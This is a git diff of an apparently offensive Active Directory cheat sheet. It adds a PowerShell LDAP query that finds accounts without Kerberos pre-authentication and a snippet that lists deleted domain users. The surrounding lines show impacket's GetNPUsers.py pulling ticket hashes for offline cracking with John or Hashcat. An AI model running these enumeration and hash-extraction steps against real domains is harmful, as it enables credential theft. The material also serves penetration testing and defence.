@@ -3,6 +3,7 @@ Windows
 
 
 ### KerberosUnConstrainedDelegation
+
 More information [here](https://adsecurity.org/?p=1667)
 
 ```powerhsell
@@ -44,6 +45,10 @@ The goal is to list the users that have this settings enable:
 - [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/445f7b2510c4553dcd9451bc4daccb20c8e67cbb/Recon/PowerView.ps1) : `Get-DomainUser -PreauthNotRequired`
 - LDAP: `userAccountControl:1.2.840.113556.1.4.803:=4194304`
 
+```powershell
+$users = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))")).FindAll()
+```
+
 Then you can use the `impacket` script [`GetNPUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
 to get the TGT in a format the `John` or `Hashcat ` can brute-force:
 
@@ -52,6 +57,15 @@ python GetNPUsers.py <domain>/ -usersfile users.txt -format <john/empty> -output
 ```
 
 From [@harmj0y](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py).
+
+
+### List deleted users
+
+```powershell
+$deletedObjectsDom = get-addomain | select DeletedObjectsContainer
+$objects = Get-ADObject -SearchBase $deletedObjectsDom.DeletedObjectsContainer -ldapfilter "(objectClass=user)" -IncludeDeletedObjects -properties *
+foreach ($object in $objects) { $object }
+```
 
 
 ### Collect AD users information
